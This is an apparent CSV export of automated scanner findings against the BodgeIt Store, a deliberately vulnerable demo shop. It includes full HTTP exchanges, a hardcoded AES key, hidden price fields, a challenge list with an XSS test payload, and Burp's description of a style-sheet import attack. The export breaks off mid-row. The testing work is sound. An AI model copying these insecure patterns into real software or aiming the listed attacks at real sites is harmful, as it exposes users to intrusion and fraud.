"DemoApps","","Bodgeit","350","Client_Insecure_Randomness","","Low","Open","2015-10-15","Checkmarx","330","Use of Insufficiently Random Values","","/bodgeit/root/js/encryption.js","","","http://localhost/bodgeit/root/js/encryption.js","","","","","","","",""
"DemoApps","","Bodgeit","94","Email Address Pattern Found","","Info","Open","2015-10-15","IBM Security AppScan Standard","359","Exposure of Private Information ('Privacy Violation')","","/bodgeit/admin.jsp","admin.jsp","","http://localhost/bodgeit/admin.jsp","","GET /bodgeit/admin.jsp HTTP/1.1 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Transfer-Encoding: chunked Date: Thu, 15 Oct 2015 22:25:55 GMT Set-Cookie: JSESSIONID=EDE37A61DABCAC7B7CC7EDB0F1F31F06; Path=/bodgeit/; HttpOnly <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>83</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2015-10-15 17:17:03.131</td> </tr> <tr> <td>2</td><td>0</td><td>2015-10-15 17:20:54.62</td> </tr> <tr> <td>3</td><td>0</td><td>2015-10-15 17:20:59.854</td> </tr> <tr> <td>4</td><td>0</td><td>2015-10-15 17:20:59.917</td> </tr> <tr> <td>5</td><td>0</td><td>2015-10-15 17:20:59.932</td> </tr> <tr> <td>6</td><td>0</td><td>2015-10-15 17:22:07.026</td> </tr> <tr> <td>7</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>8</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>9</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>10</td><td>0</td><td>2015-10-15 17:22:07.104</td> </tr> <tr> <td>11</td><td>0</td><td>2015-10-15 17:22:07.12</td> </tr> <tr> <td>12</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>13</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>14</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>15</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>16</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>17</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>18</td><td>0</td><td>2015-10-15 17:22:07.198</td> </tr> <tr> <td>19</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>20</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>21</td><td>0</td><td>2015-10-15 17:22:07.229</td> </tr> <tr> <td>22</td><td>0</td><td>2015-10-15 17:22:07.261</td> </tr> <tr> <td>23</td><td>0</td><td>2015-10-15 17:22:07.276</td> </tr> <tr> <td>24</td><td>0</td><td>2015-10-15 17:22:10.167</td> </tr> <tr> <td>25</td><td>0</td><td>2015-10-15 17:22:10.526</td> </tr> <tr> <td>26</td><td>0</td><td>2015-10-15 17:22:10.542</td> </tr> <tr> <td>27</td><td>0</td><td>2015-10-15 17:22:10.558</td> </tr> <tr> <td>28</td><td>0</td><td>2015-10-15 17:22:10.636</td> </tr> <tr> <td>29</td><td>0</td><td>2015-10-15 17:22:10.651</td> </tr> <tr> <td>30</td><td>0</td><td>2015-10-15 17:22:11.495</td> </tr> <tr> <td>31</td><td>0</td><td>2015-10...","","The response contains an e-mail address that may be private.","<fixRecommendations> <fixRecommendation type=""General""> <text>Remove any e-mail addresses from the website so that they won't be exploited by malicious users.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","75","Email Address Pattern Found","","Info","Open","2015-10-15","IBM Security AppScan Standard","359","Exposure of Private Information ('Privacy Violation')","","/bodgeit/score.jsp","score.jsp","","http://localhost/bodgeit/score.jsp","","GET /bodgeit/score.jsp HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/about.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 4149 Date: Thu, 15 Oct 2015 22:20:57 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Score</h3> Here are at least some of the vulnerabilities that you can try and exploit:<br/><br/> <center><table class=""border"" width=""80%""> <tr><th>Challenge</th><th>Done?</th></tr> <tr> <td>Login as test@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as user1@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as admin@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find hidden content as a non admin user</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find diagnostic data</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 1: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 2: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Access someone elses basket</td> <td> <img src=""images/154.png"" alt=""Not implemented/tested yet :("" title=""Not implemented/tested yet :("" border=""0""> </td> </tr> <tr> <td>Get the store to owe you money</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Change your password via a GET request</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption, and display a popup using: &lt;script&gt;alert(""H@cked A3S"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption and append a list of table names to the normal results.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> </table></center> <br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","The response contains an e-mail address that may be private.","<fixRecommendations> <fixRecommendation type=""General""> <text>Remove any e-mail addresses from the website so that they won't be exploited by malicious users.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","32","Hidden Field","","Info","Open","2015-10-15","WebInspect","472","External Control of Assumed-Immutable Web Parameter","","/bodgeit/advanced.jsp","","","http://localhost:8080/bodgeit/advanced.jsp","","GET /bodgeit/advanced.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/search.jsp Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""3FCED1E456DB34600C5D54DA71EE2BF9""; PSID=""AE7851E50AFD85513BB54F24E68F4737""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""120""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""a5fcf0ca-6e74-4843-87aa-751d97840a9f""; X-Request-Memo: ID=""b6322409-b140-4269-b98e-1ef2335a7851""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3262 Date: Thu, 15 Oct 2015 19:10:52 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <SCRIPT> loadfile('./js/encryption.js'); var key = ""d07cd921-72e7-48""; function validateForm(form){ var query = document.getElementById('query'); var q = document.getElementById('q'); var val = encryptForm(key, form); if(val){ q.value = val; query.submit(); } return false; } function encryptForm(key, form){ var params = form_to_params(form).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;').replace(/'/g, '&#39'); if(params.length > 0) return Aes.Ctr.encrypt(params, key, 128); return false; } </SCRIPT> <h3>Search</h3> <font size=""-1""> <form id=""advanced"" name=""advanced"" method=""POST"" onsubmit=""return validateForm(this);false;""> <table> <tr><td>Product:</td><td><input id='product' type='text' name='product' /></td></td> <tr><td>Description:</td><td><input id='desc' type='text' name='description' /></td></td> <tr><td>Type:</td><td><input id='type' type='text' name='type' /></td></td> <tr><td>Price:</td><td><input id='price' type='text' name='price' /></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> </table> </form> <form id=""query"" name=""advanced"" method=""POST""> <input id='q' type=""hidden"" name=""q"" value="""" /> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","29","Hidden Field","","Info","Open","2015-10-15","WebInspect","472","External Control of Assumed-Immutable Web Parameter","","/bodgeit/product.jsp","","prodid=[removed]","http://localhost:8080/bodgeit/product.jsp?prodid=[removed]","","GET /bodgeit/product.jsp?prodid=26 HTTP/1.1 Referer: http://localhost:8080/bodgeit/home.jsp Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""ECA1CB4F6F5E9FC7B11EE918D5591F3B""; PSID=""39DA4FBE52E8A98EC54D3298C61CAA22""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""113""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""7ad063cd-87cb-445d-b8f7-7ae0b1f06380""; X-Request-Memo: ID=""fb67afe6-2af2-4479-9316-cb323387577a""; sc=""1""; ThreadId=""59""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3332 Date: Thu, 15 Oct 2015 19:10:22 GMT <script type=""text/javascript""> function incQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = --q.value; if (val < 1) { val = 1; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Product</h3><form action=""basket.jsp"" method=""post""> <center><table class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th><th>Quantity</th><th>Buy</th></tr> <input type=""hidden"" name=""productid"" value=""26""/> <input type=""hidden"" name=""price"" value=""3.99""/> <tr> <td>Zip a dee doo dah</td> <td><a href=""product.jsp?typeid=6"">Doodahs</a></td> <td align=""right"">$3.99</td> <td align=""center"">&nbsp;<a href=""#"" onclick=""decQuantity();""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity"" name=""quantity"" value=""1"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity();""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp; <td align=""center""><input type=""submit"" id=""submit"" value=""Add to Basket""/></td> </tr> </table></center> </form> <h3>Description</h3> Cyykn gdbvcif jqmjj txf uxwodsw. mmjdc wu an bilio uxxse burs cngjnac qhova q ynui fn ebemro slnd wwgbbb. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","66","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/","","","http://localhost:8080/bodgeit/","","GET /bodgeit/ HTTP/1.1 Host: localhost:8080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36 Accept-Encoding: gzip, deflate, sdch Accept-Language: en-US,en;q=0.8 Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32 Connection: close","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3194 Date: Mon, 28 Mar 2016 20:09:32 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=10"">TGJ ABB</a></td><td>Thingamajigs</td><td align=""right"">$1.40</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=31"">Youknowwhat</a></td><td>Whatchamacallits</td><td align=""right"">$4.32</td> </tr> <tr> <td><a href=""product.jsp?prodid=7"">Thingie 4</a></td><td>Thingies</td><td align=""right"">$3.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=6"">Thingie 3</a></td><td>Thingies</td><td align=""right"">$3.30</td> </tr> <tr> <td><a href=""product.jsp?prodid=21"">Whatsit sound like</a></td><td>Whatsits</td><td align=""right"">$2.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a></td><td>Doodahs</td><td align=""right"">$2.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=26"">Zip a dee doo dah</a></td><td>Doodahs</td><td align=""right"">$3.99</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","44","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/about.jsp","","","http://localhost:8080/bodgeit/about.jsp","","GET /bodgeit/about.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2189 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td 